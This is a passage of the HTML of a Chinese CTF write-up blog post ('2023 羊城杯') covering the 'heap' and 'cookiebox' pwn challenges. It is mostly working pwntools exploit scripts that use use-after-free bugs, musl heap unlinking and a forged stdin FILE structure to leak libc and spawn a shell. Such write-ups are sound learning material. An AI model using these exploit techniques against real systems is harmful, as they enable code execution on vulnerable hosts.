class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;1 &#x27;</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;3 &#x27;</span> + <span class="built_in">str</span>(index).encode() + <span class="string">b&#x27;:&#x27;</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;4 &#x27;</span> + <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;2 &#x27;</span> + <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x14CB&#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1955&#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1509&#x27;)#mallco</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1667&#x27;)#delete</span></span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*<span class="number">0x62</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">0x60</span>+<span class="string">b&quot;\xa0\x08&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&quot;b&quot;</span>*<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&quot;c&quot;</span>*<span class="number">0x58</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;nt: &#x27;</span>)</span><br><span class="line">libc_base=uu64(r(<span class="number">6</span>))-<span class="number">0x219c80</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libc_base)</span><br><span class="line">system=libc_base+libcelf.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sl(<span class="string">b&#x27;1 &#x27;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x60</span>+p64(libc_base+<span class="number">0x219058</span>-<span class="number">0x50</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>)<span class="comment">#3</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x50</span>+p64(system))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>2.35变成了exit前加锁函数变为了pthread_mutex_lock，存储在 ___rtld_mutex_lock中，但是这个地址不可写了</p>
<p><img src="/2023/09/07/2023-ycb/image-20230908183549480.png" alt="image-20230908183549480"></p>
<p><img src="/2023/09/07/2023-ycb/image-20230908183435298.png" alt="image-20230908183435298"></p>
<p>或者可以该elf的link_map-&gt;Elf64_Addr l_addr使.fini变为ogg</p>
<p>或者可以通过environ泄露栈地址，通过偏移修改返回地址为ogg</p>
<h2 id="cookiebox"><a href="#cookiebox" class="headerlink" title="cookiebox"></a>cookiebox</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/2/c/t/P/cookieBox&gt; ./libc.so</span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.1.24</span><br><span class="line">Dynamic Program Loader</span><br><span class="line">Usage: ./libc.so [options] [--] pathname [args]</span><br></pre></td></tr></table></figure>

<p>1.1.24 musl pwn 这篇文章比较详细 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253">https://www.anquanke.com/post/id/202253</a></p>
<p>patch方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./libc.so ./cookiebox</span><br></pre></td></tr></table></figure>

<p>delete时存在uaf可以，虽然在edit和show时还有个大小检测，但是利用之前残余的指针来释放现有的堆，绕过这个大小检测</p>
<p>申请过程中有类似glibc中unlink的操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/malloc/malloc.c L188-L213</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span><span class="comment">//c为要取出的堆</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 若 bin 只有一个 chunk，将 bin 设为空 bin</span></span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">// 取出链表中的 chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// 设置 INUSE 标志位</span></span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以实现写地址，覆盖bin-&gt;head为stdin-0x20，打FSOP即可，要注意stdin-0x10和-0x8处存放的地址要可写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./cookieBox&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the Content:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the idx:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the idx:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the content:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the idx:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="comment"># db(&#x27;0x0400AA8&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># db(&#x27;0x0400BB3&#x27;)#free</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc=uu64(r(<span class="number">6</span>))-<span class="number">0x292e50</span></span><br><span class="line">stdin=libc+<span class="number">0x292200</span></span><br><span class="line">system=libc+<span class="number">0x42688</span></span><br><span class="line">heap=libc+ <span class="number">0x292b00</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#为了申请stdin时他的next和prec可写 同时会使他的bitmap位置零</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stdin-<span class="number">0x20</span>) + p64(stdin-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x70</span>)   <span class="comment"># 5</span></span><br><span class="line">delete(<span class="number">1</span>)   </span><br><span class="line">edit(<span class="number">4</span>, p64(heap) + p64(stdin - <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment"># db(&#x27;0x0400AA8&#x27;)#malloc</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span>    <span class="comment"># stdin-&gt;flags</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">32</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># stdin-&gt;wpos</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0xbeefdead</span>)  <span class="comment"># stdin-&gt;wbase</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(system)      <span class="comment"># stdin-&gt;write</span></span><br><span class="line">add(<span class="number">0x70</span>,payload)<span class="comment">#7</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/07/2023-ycb/image-20230910004155958.png" alt="image-20230910004155958"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#login"><span class="toc-number">1.</span> <span class="toc-text">login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode"><span class="toc-number">2.</span> <span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-vm"><span class="toc-number">3.</span> <span class="toc-text">easy_vm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heap"><span class="toc-number">4.</span> <span class="toc-text">heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookiebox"><span class="toc-number">5.</span> <span class="toc-text">cookiebox</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/09/07/2023-ycb/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&text=2023 羊城杯"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&is_video=false&description=2023 羊城杯"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2023 羊城杯&body=Check out this article: https://grxer.gitee.io/2023/09/07/2023-ycb/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&name=2023 羊城杯&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/09/07/2023-ycb/&t=2023 羊城杯"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    bxz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
